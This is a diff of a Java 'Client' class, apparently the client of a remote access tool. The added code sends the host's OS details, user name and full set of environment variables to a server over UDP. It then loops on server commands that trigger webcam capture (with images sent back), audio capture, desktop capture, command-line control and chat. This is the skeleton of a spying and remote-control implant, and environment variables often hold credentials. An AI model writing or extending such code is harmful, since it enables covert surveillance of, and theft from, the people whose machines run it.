@@ -1,6 +1,8 @@
 package Client;
 
-import Tools.Factory.ObjectSerialization;
+import Client.Features.*;
+import Handler.InfoHandler;
+import Handler.ObjectSerialization;
 import Tools.Network.NetworkInterface;
 
 import java.io.IOException;
@@ -8,9 +10,7 @@ import java.net.DatagramPacket;
 import java.net.DatagramSocket;
 import java.net.SocketException;
 import java.time.LocalDateTime;
-import java.util.Map;
-import java.util.Objects;
-import java.util.Random;
+import java.util.*;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
@@ -26,9 +26,18 @@ public class Client extends NetworkInterface {
     private static final Random rand = new Random(LocalDateTime.now().getSecond());
     private static final int id = rand.nextInt(1000000);
 
+    private final InfoHandler infoHandler;
+
+    private final CameraCapture cameraCapture = new CameraCapture(0);
+    private final AudioCapture audioCapture = new AudioCapture();
+    private final Chat chat = new Chat();
+    private final CMDControl cmdControl = new CMDControl();
+    private final DesktopCapture desktopCapture = new DesktopCapture();
+
     public Client(int PORT) throws SocketException {
         super(PORT);
         socket = new DatagramSocket();
+        infoHandler = new InfoHandler(socket);
         threadListener.execute(listener());
     }
 
@@ -37,57 +46,71 @@ public class Client extends NetworkInterface {
             try {
                 packet = new DatagramPacket(new byte[]{CommandByte.START_BYTE, (byte) id}, 2);
                 socket.connect(address, PORT);
-                send(packet.getData(), packet.getData().length);
+                infoHandler.send(new byte[]{CommandByte.START_BYTE, (byte) id }, 2);
                 socket.disconnect();
-                byte[] dataReceived = receive(1, packet.getAddress(), packet.getPort());
+                byte[] dataReceived = infoHandler.receive(1, infoHandler.getAddress(), infoHandler.getPort());
                 if (dataReceived[0] == CommandByte.CONFIRMATION_BYTE) {
                     System.out.println("Client connected to a server!");
+                    threadListener.execute(infoListener());
                 }
             } catch (IOException e) {
                 e.printStackTrace();
             }
-            threadListener.execute(infoListener());
         };
     }
 
     private Runnable infoListener() {
         return () -> {
             ClientInfo<String[]> osInfoClient = () -> new String[]
-                    {String.valueOf(id),
+                    {       String.valueOf(id),
                             System.getProperty("os.name"),
                             System.getProperty("os.version"),
                             System.getProperty("os.vendor"),
                             System.getProperty("os.arch"),
-                            System.getProperty("user.name")};
-
+                            System.getProperty("user.name")
+                    };
             ClientInfo<Map<String, String>> osInfoSystem = System::getenv;
 
             byte[] objInfo = Objects.requireNonNull(ObjectSerialization.serialize(osInfoClient.get()));
             byte[] objSystem = Objects.requireNonNull(ObjectSerialization.serialize(osInfoSystem.get()));
 
-            while (true) {
-                try {
-                    packet = new DatagramPacket(objInfo, objInfo.length);
-                    socket.connect(address, PORT);
-                    send(objInfo, objInfo.length);
+            try {
+                socket.connect(address, PORT);
+                infoHandler.send(objInfo, objInfo.length);
 
-                    packet = new DatagramPacket(objSystem, objSystem.length);
-                    send(objSystem, objSystem.length);
-                    socket.disconnect();
+                infoHandler.send(objSystem, objSystem.length);
+                socket.disconnect();
 
-                    if (receive(1, packet.getAddress(), packet.getPort())[0] == CommandByte.INFO_ACHIEVED_BYTE)
-                        break;
-                } catch (IOException e) {
-                    e.printStackTrace();
+                if (infoHandler.receive(1, infoHandler.getAddress(), infoHandler.getPort())[0] == CommandByte.INFO_ACHIEVED_BYTE){
+                    threadListener.execute(featureListener());
                 }
+            } catch (IOException e) {
+                e.printStackTrace();
             }
-            threadListener.execute(featureListener());
         };
     }
 
     private Runnable featureListener() {
         return () -> {
+            outer:
             while (true) {
+                try {
+                    byte[] data = infoHandler.receive(1, infoHandler.getAddress(), infoHandler.getPort());
+                    switch (data[0]) {
+                        case CommandByte.CAMERA_BYTE -> {
+                            cameraCapture.startFeature();
+                            byte[] imageData = cameraCapture.getImageAsByteArray();
+                            infoHandler.send(imageData, imageData.length, infoHandler.getAddress(), infoHandler.getPort());
+                        }
+                        case CommandByte.AUDIOCAPTURE_BYTE -> audioCapture.startFeature();
+                        case CommandByte.CMDCONTROL_BYTE -> cmdControl.startFeature();
+                        case CommandByte.DESKTOPCONTROL_BYTE -> desktopCapture.startFeature();
+                        case CommandByte.CHAT_BYTE -> chat.startFeature();
+                        case CommandByte.STOP_BYTE -> { break outer; }
+                    }
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
                 sleep(1000 / 60);
             }
         };
